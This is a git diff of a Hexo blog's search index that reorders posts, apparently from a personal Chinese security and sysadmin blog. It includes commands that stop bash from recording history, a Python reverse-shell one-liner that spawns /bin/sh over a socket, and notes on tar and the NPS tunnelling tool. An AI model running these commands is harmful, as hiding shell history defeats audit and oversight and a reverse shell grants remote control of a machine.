@@ -212,6 +212,17 @@ PasswordAuthentication yes
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
+    <title>Linux 使输入的命令不被记录</title>
+    <url>/2021/12/22/index_3/</url>
+    <content><![CDATA[<p>使输入的命令不被记录：<code>unset HISTFILE</code></p>
+<pre><code>unset HISTFILE 
+</code></pre>
+<h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><pre><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+</code></pre>
+<h5 id="这样的话，在Linux上输入的命令将不会记录在-bash-history"><a href="#这样的话，在Linux上输入的命令将不会记录在-bash-history" class="headerlink" title="这样的话，在Linux上输入的命令将不会记录在 .bash_history"></a>这样的话，在Linux上输入的命令将不会记录在 <code>.bash_history</code></h5>
+]]></content>
+  </entry>
+  <entry>
     <title>几种反弹shell的方式</title>
     <url>/2021/12/23/index_4/</url>
     <content><![CDATA[<h3 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h3><pre><code class="Python">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
@@ -226,17 +237,6 @@ PasswordAuthentication yes
 ]]></content>
   </entry>
   <entry>
-    <title>Linux 使输入的命令不被记录</title>
-    <url>/2021/12/22/index_3/</url>
-    <content><![CDATA[<p>使输入的命令不被记录：<code>unset HISTFILE</code></p>
-<pre><code>unset HISTFILE 
-</code></pre>
-<h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><pre><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
-</code></pre>
-<h5 id="这样的话，在Linux上输入的命令将不会记录在-bash-history"><a href="#这样的话，在Linux上输入的命令将不会记录在-bash-history" class="headerlink" title="这样的话，在Linux上输入的命令将不会记录在 .bash_history"></a>这样的话，在Linux上输入的命令将不会记录在 <code>.bash_history</code></h5>
-]]></content>
-  </entry>
-  <entry>
     <title>Linux 压缩命令</title>
     <url>/2021/12/23/index_5/</url>
     <content><![CDATA[<h3 id="压缩："><a href="#压缩：" class="headerlink" title="压缩："></a>压缩：</h3><pre><code>tar -zcvf &lt;自定义文件名&gt;  &lt;需要压缩的目录或文件路径&gt; 
@@ -248,22 +248,6 @@ PasswordAuthentication yes
 </code></pre>
 
 ]]></content>
-  </entry>
-  <entry>
-    <title>之前的博客出了点问题</title>
-    <url>/2021/12/15/test/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="a62f0fdcf56bf884a6cfda58f4f87fddeeb4b1120dde50201c246613d620298f">1d621d107eecb08cb114bf54a2314beae69c4d7afa0dd1c19e06f21c7a8688e2e65b8583b48cb17d59d81f7bd18a3dda63dc3d7028f0e416eb97c5824402a997acda250a8665728488364d1c1b014da19a387cfd4f03ef4a98b31a163e4de256c7e4c5397fdbdd826497e8a3c134556083d24e4fc61277985d6950771f173896cec7d7c6f0d57511e12b6c0e033b4a32</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
     <title>NPS使用</title>
@@ -311,5 +295,21 @@ nps restart
 </ul>
 
 </div>]]></content>
+  </entry>
+  <entry>
+    <title>之前的博客出了点问题</title>
+    <url>/2021/12/15/test/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="a62f0fdcf56bf884a6cfda58f4f87fddeeb4b1120dde50201c246613d620298f">1d621d107eecb08cb114bf54a2314beae69c4d7afa0dd1c19e06f21c7a8688e2e65b8583b48cb17d59d81f7bd18a3dda63dc3d7028f0e416eb97c5824402a997acda250a8665728488364d1c1b014da19a387cfd4f03ef4a98b31a163e4de256c7e4c5397fdbdd826497e8a3c134556083d24e4fc61277985d6950771f173896cec7d7c6f0d57511e12b6c0e033b4a32</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
 </search>
